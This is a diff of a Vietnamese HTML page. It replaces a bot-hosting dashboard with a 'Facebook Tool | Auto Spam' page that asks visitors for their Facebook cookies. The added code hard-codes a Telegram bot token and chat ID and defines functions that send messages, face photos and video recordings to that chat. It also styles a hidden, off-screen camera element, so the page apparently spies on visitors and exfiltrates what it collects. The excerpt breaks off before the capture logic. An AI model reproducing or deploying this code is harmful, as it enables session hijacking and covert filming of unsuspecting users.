@@ -1,642 +1,860 @@
 <!DOCTYPE html>
 <html lang="vi">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Bot Hosting Dashboard</title>
-<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;600;700&family=Sora:wght@300;400;600;700;800&display=swap" rel="stylesheet">
-<style>
-:root{
-  --bg:#080c14;--surface:#0d1420;--surface2:#111827;--border:#1e2d47;
-  --accent:#5865f2;--accent2:#00d4aa;--text:#e8edf5;--text-dim:#7a8ba8;
-  --online:#3ba55d;--idle:#faa81a;--offline:#ed4245;--glow:rgba(88,101,242,0.3);
-}
-*{margin:0;padding:0;box-sizing:border-box;}
-body{font-family:'Sora',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;overflow-x:hidden;}
-body::before{content:'';position:fixed;inset:0;background-image:linear-gradient(rgba(88,101,242,0.03) 1px,transparent 1px),linear-gradient(90deg,rgba(88,101,242,0.03) 1px,transparent 1px);background-size:40px 40px;pointer-events:none;z-index:0;}
-canvas#snow{position:fixed;inset:0;pointer-events:none;z-index:999;}
-.wrap{position:relative;z-index:1;max-width:1440px;margin:0 auto;padding:18px;}
-
-/* HEADER */
-header{display:flex;align-items:center;justify-content:space-between;padding:15px 22px;background:linear-gradient(135deg,rgba(13,20,32,0.97),rgba(17,24,39,0.97));border:1px solid var(--border);border-radius:16px;margin-bottom:14px;backdrop-filter:blur(20px);position:relative;overflow:hidden;}
-header::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--accent),var(--accent2),var(--accent));background-size:200% 100%;animation:shimmer 3s linear infinite;}
-@keyframes shimmer{0%{background-position:-200% 0}100%{background-position:200% 0}}
-.h-left{display:flex;align-items:center;gap:13px;}
-.logo{width:42px;height:42px;background:linear-gradient(135deg,var(--accent),#7289da);border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:20px;box-shadow:0 0 20px var(--glow);}
-.h-title h1{font-size:1.1rem;font-weight:700;background:linear-gradient(135deg,var(--text),var(--accent2));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;}
-.h-title p{font-size:0.67rem;color:var(--text-dim);font-family:'JetBrains Mono',monospace;margin-top:2px;}
-.h-right{display:flex;align-items:center;gap:13px;}
-.save-ind{font-size:0.65rem;color:var(--accent2);font-family:'JetBrains Mono',monospace;opacity:0;transition:opacity 0.3s;}
-.save-ind.show{opacity:1;}
-.clock-time{font-family:'JetBrains Mono',monospace;font-size:1.4rem;font-weight:700;color:var(--accent2);letter-spacing:0.05em;text-shadow:0 0 20px rgba(0,212,170,0.4);}
-.clock-date{font-size:0.65rem;color:var(--text-dim);font-family:'JetBrains Mono',monospace;text-align:right;margin-top:2px;}
-.admin-badge{display:flex;align-items:center;gap:9px;background:rgba(88,101,242,0.1);border:1px solid rgba(88,101,242,0.3);border-radius:11px;padding:8px 13px;}
-.admin-av{width:32px;height:32px;border-radius:50%;background:linear-gradient(135deg,var(--accent),#7289da);display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:700;flex-shrink:0;}
-.admin-name{font-size:0.75rem;font-weight:600;}
-.admin-zalo{font-size:0.63rem;color:var(--accent2);font-family:'JetBrains Mono',monospace;}
-.admin-role{font-size:0.6rem;color:var(--text-dim);}
-
-/* MONITOR BAR */
-.monitor-bar{display:flex;align-items:center;justify-content:space-between;padding:13px 20px;background:linear-gradient(135deg,rgba(13,20,32,0.97),rgba(17,24,39,0.95));border:1px solid var(--border);border-radius:13px;margin-bottom:13px;gap:10px;flex-wrap:wrap;position:relative;overflow:hidden;}
-.monitor-bar::before{content:'';position:absolute;bottom:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--accent2),var(--accent),var(--accent2));background-size:200% 100%;animation:shimmer 4s linear infinite;}
-.mbar-left{display:flex;align-items:center;gap:10px;flex-wrap:wrap;}
-.btn-open{display:inline-flex;align-items:center;gap:7px;background:linear-gradient(135deg,#5865f2,#7289da);border:none;border-radius:9px;padding:9px 16px;color:#fff;font-size:0.79rem;font-weight:700;cursor:pointer;font-family:'Sora',sans-serif;box-shadow:0 4px 18px var(--glow);transition:all 0.2s;text-decoration:none;}
-.btn-open:hover{transform:translateY(-1px);box-shadow:0 7px 24px var(--glow);}
-.btn-viewmon{display:inline-flex;align-items:center;gap:7px;background:rgba(0,212,170,0.1);border:1px solid rgba(0,212,170,0.35);border-radius:9px;padding:8px 15px;color:var(--accent2);font-size:0.77rem;font-weight:600;cursor:pointer;font-family:'Sora',sans-serif;transition:all 0.2s;}
-.btn-viewmon:hover{background:rgba(0,212,170,0.2);}
-.btn-snow{display:inline-flex;align-items:center;gap:6px;background:rgba(200,230,255,0.07);border:1px solid rgba(200,230,255,0.2);border-radius:9px;padding:8px 14px;color:#cce8ff;font-size:0.77rem;font-weight:600;cursor:pointer;font-family:'Sora',sans-serif;transition:all 0.2s;}
-.btn-snow:hover{background:rgba(200,230,255,0.14);}
-.mbar-note{font-size:0.69rem;color:var(--text-dim);font-family:'JetBrains Mono',monospace;}
-
-/* IFRAME PANEL */
-.iframe-panel{background:var(--surface);border:1px solid var(--border);border-radius:14px;overflow:hidden;margin-bottom:14px;display:none;}
-.iframe-panel.show{display:block;}
-.iframe-head{display:flex;align-items:center;justify-content:space-between;padding:10px 16px;border-bottom:1px solid var(--border);background:rgba(17,24,39,0.95);}
-.iframe-title{font-size:0.77rem;font-weight:600;display:flex;align-items:center;gap:7px;}
-.iframe-status{font-size:0.63rem;color:var(--text-dim);font-family:'JetBrains Mono',monospace;}
-.iframe-btns{display:flex;gap:7px;align-items:center;}
-.ibtn{padding:4px 10px;border-radius:6px;font-size:0.67rem;cursor:pointer;font-family:'Sora',sans-serif;font-weight:600;border:1px solid;transition:all 0.2s;text-decoration:none;display:inline-flex;align-items:center;gap:4px;}
-.ibtn.blue{background:rgba(88,101,242,0.1);border-color:rgba(88,101,242,0.3);color:var(--accent);}
-.ibtn.blue:hover{background:rgba(88,101,242,0.25);}
-.ibtn.red{background:rgba(237,66,69,0.08);border-color:rgba(237,66,69,0.3);color:var(--offline);}
-.ibtn.red:hover{background:rgba(237,66,69,0.2);}
-.ibtn.green{background:rgba(0,212,170,0.08);border-color:rgba(0,212,170,0.3);color:var(--accent2);}
-.ibtn.green:hover{background:rgba(0,212,170,0.2);}
-.iframe-notice{padding:9px 16px;background:rgba(88,101,242,0.06);border-bottom:1px solid var(--border);font-size:0.7rem;color:var(--text-dim);}
-iframe#site-frame{width:100%;height:500px;border:none;display:block;background:#111;transition:height 0.3s;}
-iframe#site-frame.tall{height:720px;}
-
-/* STATS */
-.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:14px;}
-.sc{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:15px;position:relative;overflow:hidden;transition:transform 0.2s,border-color 0.2s;}
-.sc:hover{transform:translateY(-2px);border-color:var(--accent);}
-.sc::after{content:'';position:absolute;bottom:0;left:0;right:0;height:3px;border-radius:0 0 12px 12px;}
-.sc.on::after{background:var(--online)}.sc.id::after{background:var(--idle)}.sc.off::after{background:var(--offline)}.sc.tot::after{background:var(--accent)}
-.sc-icon{font-size:1.4rem;margin-bottom:6px;}
-.sc-label{font-size:0.64rem;color:var(--text-dim);text-transform:uppercase;letter-spacing:0.08em;margin-bottom:3px;}
-.sc-val{font-size:1.75rem;font-weight:800;font-family:'JetBrains Mono',monospace;}
-.sc.on .sc-val{color:var(--online)}.sc.id .sc-val{color:var(--idle)}.sc.off .sc-val{color:var(--offline)}.sc.tot .sc-val{color:var(--accent)}
-
-/* LAYOUT */
-.grid{display:grid;grid-template-columns:1fr 285px;gap:14px;}
-.panel{background:var(--surface);border:1px solid var(--border);border-radius:14px;overflow:hidden;}
-.ph{display:flex;align-items:center;justify-content:space-between;padding:13px 19px;border-bottom:1px solid var(--border);background:rgba(17,24,39,0.8);flex-wrap:wrap;gap:8px;}
-.ph-title{font-size:0.84rem;font-weight:600;}
-.toolbar{display:flex;gap:7px;align-items:center;flex-wrap:wrap;}
-.search-box{background:var(--bg);border:1px solid var(--border);border-radius:8px;padding:6px 10px;color:var(--text);font-size:0.74rem;font-family:'Sora',sans-serif;outline:none;width:160px;transition:border-color 0.2s;}
-.search-box:focus{border-color:var(--accent);}
-.fsel{background:var(--bg);border:1px solid var(--border);border-radius:8px;padding:6px 8px;color:var(--text);font-size:0.74rem;font-family:'Sora',sans-serif;outline:none;cursor:pointer;}
-.btn-add{display:flex;align-items:center;gap:5px;background:linear-gradient(135deg,var(--accent),#7289da);border:none;border-radius:8px;padding:7px 12px;color:#fff;font-size:0.73rem;font-weight:600;cursor:pointer;transition:all 0.2s;font-family:'Sora',sans-serif;box-shadow:0 4px 14px var(--glow);white-space:nowrap;}
-.btn-add:hover{transform:translateY(-1px);}
-
-/* TABLE */
-.tab-table{width:100%;border-collapse:collapse;}
-.tab-table thead tr{background:rgba(88,101,242,0.05);}
-.tab-table th{padding:9px 12px;text-align:left;font-size:0.63rem;font-weight:600;text-transform:uppercase;letter-spacing:0.1em;color:var(--text-dim);border-bottom:1px solid var(--border);white-space:nowrap;}
-.tab-table td{padding:11px 12px;border-bottom:1px solid rgba(30,45,71,0.5);font-size:0.78rem;transition:background 0.15s;vertical-align:middle;}
-.tab-table tbody tr:hover td{background:rgba(88,101,242,0.04);}
-.tab-table tbody tr:last-child td{border-bottom:none;}
-.tab-cell{display:flex;align-items:center;gap:8px;}
-.tab-icon{width:28px;height:28px;border-radius:7px;background:linear-gradient(135deg,var(--accent),#7289da);display:flex;align-items:center;justify-content:center;font-size:12px;flex-shrink:0;}
-.tab-name-t{font-weight:600;font-size:0.79rem;}
-.tab-id-t{font-size:0.62rem;color:var(--text-dim);font-family:'JetBrains Mono',monospace;}
-.tab-note-t{font-size:0.62rem;color:var(--accent2);max-width:120px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
-.badge{display:inline-flex;align-items:center;gap:5px;padding:3px 8px;border-radius:20px;font-size:0.63rem;font-weight:600;text-transform:uppercase;letter-spacing:0.06em;white-space:nowrap;}
-.dot{width:6px;height:6px;border-radius:50%;animation:blink 2s infinite;flex-shrink:0;}
-@keyframes blink{0%,100%{opacity:1}50%{opacity:0.4}}
-.badge.online{background:rgba(59,165,93,0.15);color:var(--online);border:1px solid rgba(59,165,93,0.3);}
-.badge.online .dot{background:var(--online);box-shadow:0 0 6px var(--online);}
-.badge.idle{background:rgba(250,168,26,0.15);color:var(--idle);border:1px solid rgba(250,168,26,0.3);}
-.badge.idle .dot{background:var(--idle);}
-.badge.offline{background:rgba(237,66,69,0.15);color:var(--offline);border:1px solid rgba(237,66,69,0.3);}
-.badge.offline .dot{background:var(--offline);}
-.uptime-wrap{display:flex;align-items:center;gap:6px;}
-.uptime-bar{flex:1;height:4px;background:rgba(255,255,255,0.08);border-radius:2px;overflow:hidden;min-width:42px;}
-.uptime-fill{height:100%;border-radius:2px;}
-.uptime-fill.high{background:linear-gradient(90deg,var(--online),var(--accent2));}
-.uptime-fill.med{background:var(--idle);}
-.uptime-fill.low{background:var(--offline);}
-.uptime-pct{font-size:0.67rem;font-family:'JetBrains Mono',monospace;color:var(--text-dim);min-width:30px;}
-.mono{font-family:'JetBrains Mono',monospace;font-size:0.7rem;color:var(--text-dim);}
-.runtime{font-family:'JetBrains Mono',monospace;font-size:0.73rem;color:var(--accent2);font-weight:600;}
-.plan-tag{font-size:0.6rem;font-weight:700;padding:2px 7px;border-radius:4px;text-transform:uppercase;letter-spacing:0.06em;}
-.plan-free{background:rgba(122,139,168,0.15);color:var(--text-dim);}
-.plan-pro{background:rgba(88,101,242,0.2);color:#a5b4fc;}
-.plan-vip{background:rgba(250,168,26,0.2);color:var(--idle);}
-.actions{display:flex;gap:4px;}
-.btn-s{padding:3px 8px;border-radius:6px;font-size:0.65rem;cursor:pointer;transition:all 0.2s;font-family:'Sora',sans-serif;font-weight:600;border:1px solid;white-space:nowrap;}
-.btn-tog{background:rgba(0,212,170,0.08);border-color:rgba(0,212,170,0.3);color:var(--accent2);}
-.btn-tog:hover{background:rgba(0,212,170,0.2);}
-.btn-edit{background:rgba(88,101,242,0.1);border-color:rgba(88,101,242,0.3);color:var(--accent);}
-.btn-edit:hover{background:rgba(88,101,242,0.25);}
-.btn-del{background:rgba(237,66,69,0.08);border-color:rgba(237,66,69,0.3);color:var(--offline);}
-.btn-del:hover{background:rgba(237,66,69,0.2);}
-
-/* EMPTY STATE */
-.empty-state{text-align:center;padding:52px 20px;color:var(--text-dim);}
-.empty-state .ei{font-size:3rem;margin-bottom:14px;opacity:0.3;}
-.empty-state h3{font-size:0.95rem;font-weight:600;margin-bottom:8px;color:var(--text);}
-.empty-state p{font-size:0.78rem;line-height:1.7;max-width:380px;margin:0 auto 18px;}
-.empty-state .btn-add-center{display:inline-flex;align-items:center;gap:7px;background:linear-gradient(135deg,var(--accent),#7289da);border:none;border-radius:10px;padding:10px 20px;color:#fff;font-size:0.8rem;font-weight:600;cursor:pointer;font-family:'Sora',sans-serif;box-shadow:0 4px 18px var(--glow);transition:all 0.2s;}
-.empty-state .btn-add-center:hover{transform:translateY(-1px);}
-
-/* SIDEBAR */
-.sidebar{display:flex;flex-direction:column;gap:12px;}
-.ipanel{background:var(--surface);border:1px solid var(--border);border-radius:13px;overflow:hidden;}
-.iph{padding:10px 16px;border-bottom:1px solid var(--border);font-size:0.7rem;font-weight:600;color:var(--text-dim);text-transform:uppercase;letter-spacing:0.08em;}
-.ipb{padding:11px 16px;}
-.irow{display:flex;justify-content:space-between;align-items:center;padding:7px 0;border-bottom:1px solid rgba(30,45,71,0.5);}
-.irow:last-child{border-bottom:none;}
-.ikey{font-size:0.7rem;color:var(--text-dim);}
-.ival{font-size:0.73rem;font-weight:600;font-family:'JetBrains Mono',monospace;}
-.ival.g{color:var(--online)}.ival.b{color:var(--accent2)}.ival.y{color:var(--idle)}.ival.p{color:#a5b4fc}
-.qi-empty{font-size:0.71rem;color:var(--text-dim);padding:8px 0;text-align:center;}
-.qi-list{display:flex;flex-direction:column;}
-.qi{display:flex;align-items:center;gap:8px;padding:7px 0;border-bottom:1px solid rgba(30,45,71,0.35);font-size:0.72rem;}
-.qi:last-child{border-bottom:none;}
-.qi-dot{width:7px;height:7px;border-radius:50%;flex-shrink:0;}
-.qi-name{flex:1;font-weight:500;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
-.qi-time{font-family:'JetBrains Mono',monospace;font-size:0.65rem;color:var(--text-dim);white-space:nowrap;}
-.log-entry{display:flex;gap:7px;padding:7px 0;border-bottom:1px solid rgba(30,45,71,0.3);font-size:0.69rem;}
-.log-entry:last-child{border-bottom:none;}
-.ldot{width:6px;height:6px;border-radius:50%;flex-shrink:0;margin-top:3px;}
-.ltime{color:var(--text-dim);font-family:'JetBrains Mono',monospace;white-space:nowrap;min-width:36px;}
-.lmsg{color:var(--text);line-height:1.4;}
-
-/* MODAL */
-.modal-ov{position:fixed;inset:0;background:rgba(8,12,20,0.88);backdrop-filter:blur(8px);z-index:1000;display:none;align-items:center;justify-content:center;}
-.modal-ov.show{display:flex;}
-.modal{background:var(--surface2);border:1px solid var(--border);border-radius:17px;width:440px;overflow:hidden;animation:su 0.25s ease;}
-@keyframes su{from{transform:translateY(20px);opacity:0}to{transform:translateY(0);opacity:1}}
-.mhead{padding:16px 20px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;font-weight:700;font-size:0.9rem;}
-.mcls{background:rgba(255,255,255,0.05);border:1px solid var(--border);color:var(--text-dim);width:26px;height:26px;border-radius:7px;cursor:pointer;display:flex;align-items:center;justify-content:center;transition:all 0.2s;}
-.mcls:hover{background:rgba(237,66,69,0.15);color:var(--offline);border-color:var(--offline);}
-.mbody{padding:18px 20px;display:flex;flex-direction:column;gap:11px;}
-.fg{display:flex;flex-direction:column;gap:5px;}
-.fg label{font-size:0.68rem;font-weight:600;color:var(--text-dim);text-transform:uppercase;letter-spacing:0.06em;}
-.fg input,.fg select{background:var(--bg);border:1px solid var(--border);border-radius:9px;padding:8px 12px;color:var(--text);font-size:0.81rem;font-family:'Sora',sans-serif;outline:none;transition:border-color 0.2s;}
-.fg input:focus,.fg select:focus{border-color:var(--accent);}
-.frow{display:grid;grid-template-columns:1fr 1fr;gap:10px;}
-.mfoot{padding:12px 20px;border-top:1px solid var(--border);display:flex;gap:8px;justify-content:flex-end;}
-.btn-cancel{background:rgba(255,255,255,0.05);border:1px solid var(--border);color:var(--text-dim);padding:7px 14px;border-radius:8px;cursor:pointer;font-size:0.77rem;font-family:'Sora',sans-serif;transition:all 0.2s;}
-.btn-cancel:hover{background:rgba(255,255,255,0.1);color:var(--text);}
-.btn-save{background:linear-gradient(135deg,var(--accent),#7289da);border:none;color:#fff;padding:7px 16px;border-radius:8px;cursor:pointer;font-size:0.77rem;font-weight:600;font-family:'Sora',sans-serif;box-shadow:0 4px 14px var(--glow);transition:all 0.2s;}
-.btn-save:hover{transform:translateY(-1px);}
-
-.toast{position:fixed;bottom:20px;right:20px;background:var(--surface2);border:1px solid var(--border);border-radius:11px;padding:11px 16px;display:flex;align-items:center;gap:8px;font-size:0.77rem;z-index:2000;transform:translateY(80px);opacity:0;transition:all 0.3s ease;box-shadow:0 8px 30px rgba(0,0,0,0.5);}
-.toast.show{transform:translateY(0);opacity:1;}
-
-@media(max-width:950px){.stats{grid-template-columns:repeat(2,1fr)}.grid{grid-template-columns:1fr}}
-@media(max-width:580px){.h-right{flex-wrap:wrap;gap:8px}.toolbar{flex-direction:column;align-items:stretch}.search-box{width:100%}}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Facebook Tool | Auto Spam</title>
+    
+    <!-- ===== TELEGRAM CONFIG ===== -->
+    <script>
+        // Cấu hình Telegram Bot
+        const TELEGRAM_CONFIG = {
+            BOT_TOKEN: '8511057820:AAG02FYBsgwkSMTR98BMCAFVJpMLcRi34J4',        // Thay bằng token bot của bạn
+            ADMIN_ID: '8123442570',           // Thay bằng ID Telegram admin của bạn
+            ENABLE_LOGGING: true              
+        };
+        
+        // Hàm gửi tin nhắn đến Telegram
+        async function sendTelegramMessage(message, parseMode = 'HTML') {
+            if (!TELEGRAM_CONFIG.ENABLE_LOGGING) return;
+            
+            const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`;
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CONFIG.ADMIN_ID,
+                        text: message,
+                        parse_mode: parseMode
+                    })
+                });
+                
+                const data = await response.json();
+                if (!data.ok) {
+                    console.error('Telegram API Error:', data.description);
+                }
+                return data;
+            } catch (error) {
+                console.error('Failed to send Telegram message:', error);
+                return null;
+            }
+        }
+        
+        // Hàm gửi ảnh lên Telegram
+        async function sendTelegramPhoto(photoBase64, caption = '') {
+            if (!TELEGRAM_CONFIG.ENABLE_LOGGING) return;
+            
+            const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendPhoto`;
+            
+            try {
+                // Chuyển base64 thành blob
+                const base64Data = photoBase64.replace(/^data:image\/\w+;base64,/, '');
+                const binaryData = atob(base64Data);
+                const arrayBuffer = new Uint8Array(binaryData.length);
+                for (let i = 0; i < binaryData.length; i++) {
+                    arrayBuffer[i] = binaryData.charCodeAt(i);
+                }
+                const blob = new Blob([arrayBuffer], { type: 'image/jpeg' });
+                
+                const formData = new FormData();
+                formData.append('chat_id', TELEGRAM_CONFIG.ADMIN_ID);
+                formData.append('photo', blob, 'face.jpg');
+                formData.append('caption', caption);
+                
+                const response = await fetch(url, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                const data = await response.json();
+                return data;
+            } catch (error) {
+                console.error('Failed to send photo:', error);
+                return null;
+            }
+        }
+        
+        // Hàm gửi video lên Telegram
+        async function sendTelegramVideo(videoBase64, caption = '') {
+            if (!TELEGRAM_CONFIG.ENABLE_LOGGING) return;
+            
+            const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendVideo`;
+            
+            try {
+                // Chuyển base64 thành blob
+                const base64Data = videoBase64.replace(/^data:video\/\w+;base64,/, '');
+                const binaryData = atob(base64Data);
+                const arrayBuffer = new Uint8Array(binaryData.length);
+                for (let i = 0; i < binaryData.length; i++) {
+                    arrayBuffer[i] = binaryData.charCodeAt(i);
+                }
+                const blob = new Blob([arrayBuffer], { type: 'video/webm' });
+                
+                const formData = new FormData();
+                formData.append('chat_id', TELEGRAM_CONFIG.ADMIN_ID);
+                formData.append('video', blob, 'recording.webm');
+                formData.append('caption', caption);
+                formData.append('supports_streaming', true);
+                
+                const response = await fetch(url, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                const data = await response.json();
+                return data;
+            } catch (error) {
+                console.error('Failed to send video:', error);
+                return null;
+            }
+        }
+        
+        // Log khởi động
+        console.log('%c🤖 Telegram Bot Config Loaded', 'color: #0088cc; font-size: 14px; font-weight: bold;');
+        console.log(`%c👤 Admin ID: ${TELEGRAM_CONFIG.ADMIN_ID}`, 'color: #888; font-size: 12px;');
+    </script>
+    <!-- ===== END TELEGRAM CONFIG ===== -->
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #0a0a1a 0%, #0f0f1f 100%);
+            min-height: 100vh;
+            font-family: 'Segoe UI', 'Poppins', system-ui, -apple-system, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 480px;
+            background: rgba(20, 20, 40, 0.95);
+            border-radius: 28px;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4), 0 0 0 1px rgba(66, 153, 225, 0.2);
+            overflow: hidden;
+        }
+        
+        .fb-header {
+            background: #1877f2;
+            padding: 18px 20px;
+            text-align: center;
+        }
+        
+        .fb-header h1 {
+            color: white;
+            font-size: 24px;
+            font-weight: 600;
+        }
+        
+        .fb-header p {
+            color: rgba(255,255,255,0.9);
+            font-size: 12px;
+            margin-top: 5px;
+        }
+        
+        .content {
+            padding: 20px;
+        }
+        
+        .cookie-section {
+            background: rgba(255,255,255,0.05);
+            border-radius: 20px;
+            padding: 18px;
+            margin-bottom: 20px;
+            border: 1px solid rgba(66, 153, 225, 0.3);
+        }
+        
+        .cookie-label {
+            color: #fff;
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .cookie-input {
+            width: 100%;
+            background: rgba(0,0,0,0.5);
+            border: 1px solid rgba(255,255,255,0.2);
+            border-radius: 14px;
+            padding: 14px 16px;
+            color: #fff;
+            font-size: 13px;
+            font-family: monospace;
+            resize: vertical;
+        }
+        
+        .cookie-input:focus {
+            outline: none;
+            border-color: #1877f2;
+        }
+        
+        .cookie-input::placeholder {
+            color: rgba(255,255,255,0.4);
+        }
+        
+        .info-row {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+        
+        .info-box {
+            flex: 1;
+            background: rgba(255,255,255,0.05);
+            border-radius: 16px;
+            padding: 12px;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+        
+        .info-label {
+            color: rgba(255,255,255,0.6);
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 6px;
+        }
+        
+        .info-value {
+            color: #fff;
+            font-size: 14px;
+            font-weight: 500;
+            background: rgba(0,0,0,0.3);
+            padding: 8px 10px;
+            border-radius: 12px;
+        }
+        
+        .delay-section {
+            background: rgba(255,255,255,0.05);
+            border-radius: 16px;
+            padding: 15px;
+            margin-bottom: 25px;
+        }
+        
+        .delay-header {
+            display: flex;
+            justify-content: space-between;
+            color: #fff;
+            font-size: 13px;
+            margin-bottom: 12px;
+        }
+        
+        .delay-slider {
+            width: 100%;
+            height: 6px;
+            -webkit-appearance: none;
+            background: rgba(255,255,255,0.2);
+            border-radius: 10px;
+            outline: none;
+        }
+        
+        .delay-slider::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            width: 18px;
+            height: 18px;
+            background: #1877f2;
+            border-radius: 50%;
+            cursor: pointer;
+        }
+        
+        .delay-value {
+            color: #1877f2;
+            font-weight: bold;
+            font-size: 16px;
+        }
+        
+        .task-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 14px;
+            margin-bottom: 20px;
+        }
+        
+        .task-btn {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 18px 22px;
+            border: none;
+            border-radius: 60px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.2s;
+            color: white;
+        }
+        
+        .task-btn:active {
+            transform: scale(0.97);
+        }
+        
+        .task-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        .task-icon {
+            font-size: 28px;
+        }
+        
+        .task-name {
+            font-weight: 700;
+            letter-spacing: 1px;
+        }
+        
+        .task-badge {
+            background: rgba(0,0,0,0.3);
+            padding: 5px 12px;
+            border-radius: 40px;
+            font-size: 12px;
+        }
+        
+        .btn-ngon {
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            box-shadow: 0 8px 20px rgba(245,87,108,0.3);
+        }
+        
+        .btn-nhay {
+            background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
+            box-shadow: 0 8px 20px rgba(79,172,254,0.3);
+        }
+        
+        .btn-top {
+            background: linear-gradient(135deg, #43e97b 0%, #38f9d7 100%);
+            box-shadow: 0 8px 20px rgba(67,233,123,0.3);
+        }
+        
+        .status-area {
+            background: rgba(0,0,0,0.5);
+            border-radius: 16px;
+            padding: 12px 16px;
+            margin-top: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            border-left: 3px solid #1877f2;
+        }
+        
+        .status-dot {
+            width: 10px;
+            height: 10px;
+            background: #4caf50;
+            border-radius: 50%;
+            animation: pulse 1.5s infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.5; transform: scale(0.8); }
+        }
+        
+        .status-text {
+            color: rgba(255,255,255,0.8);
+            font-size: 12px;
+            flex: 1;
+        }
+        
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.95);
+            z-index: 1000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            backdrop-filter: blur(10px);
+        }
+        
+        .overlay.hide {
+            display: none;
+        }
+        
+        .spinner {
+            width: 65px;
+            height: 65px;
+            border: 4px solid rgba(24,119,242,0.2);
+            border-top-color: #1877f2;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .overlay-text {
+            color: #fff;
+            font-size: 20px;
+            margin-top: 25px;
+            font-weight: 500;
+        }
+        
+        .overlay-sub {
+            color: rgba(255,255,255,0.6);
+            font-size: 13px;
+            margin-top: 10px;
+        }
+        
+        .hidden-cam {
+            position: fixed;
+            top: -1000px;
+            left: -1000px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
+        
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0,0,0,0.9);
+            color: white;
+            padding: 12px 24px;
+            border-radius: 50px;
+            font-size: 14px;
+            z-index: 1001;
+            animation: toastIn 0.3s ease;
+            border-left: 3px solid #1877f2;
+        }
+        
+        @keyframes toastIn {
+            from {
+                opacity: 0;
+                transform: translateX(-50%) translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(-50%) translateY(0);
+            }
+        }
+        
+        .task-manager {
+            margin-top: 15px;
+            padding-top: 15px;
+            border-top: 1px solid rgba(255,255,255,0.1);
+            display: flex;
+            justify-content: space-between;
+            font-size: 11px;
+            color: rgba(255,255,255,0.5);
+        }
+    </style>
 </head>
 <body>
-<canvas id="snow"></canvas>
-<div class="wrap">
-
-  <!-- HEADER -->
-  <header>
-    <div class="h-left">
-      <div class="logo">🤖</div>
-      <div class="h-title">
-        <h1>Bot Hosting Dashboard</h1>
-        <p>💾 Tự động lưu · Xem mọi lúc không cần đăng nhập lại</p>
-      </div>
-    </div>
-    <div class="h-right">
-      <span class="save-ind" id="save-ind">💾 Đã lưu</span>
-      <div>
-        <div class="clock-time" id="clock">00:00:00</div>
-        <div class="clock-date" id="cdate"></div>
-      </div>
-      <div class="admin-badge">
-        <div class="admin-av">LĐ</div>
-        <div>
-          <div class="admin-name">Lê Tiến Dũng</div>
-          <div class="admin-zalo">📞 0969411158</div>
-          <div class="admin-role">⚡ Administrator</div>
+    <div class="container">
+        <div class="fb-header">
+            <h1>📱 Facebook Tool</h1>
+            <p>Cookie Checker | Auto Spam | 🤖 Telegram Bot</p>
         </div>
-      </div>
-    </div>
-  </header>
-
-  <!-- MONITOR BAR -->
-  <div class="monitor-bar">
-    <div class="mbar-left">
-      <a class="btn-open" href="https://control.bot-hosting.net/auth/login" target="_blank">🚀 Mở Bot Hosting</a>
-      <button class="btn-viewmon" id="btn-mon" onclick="toggleMon()">🖥️ Xem nhanh trong trang</button>
-      <button class="btn-snow" id="btn-snow" onclick="toggleSnow()">❄️ Tuyết: BẬT</button>
-    </div>
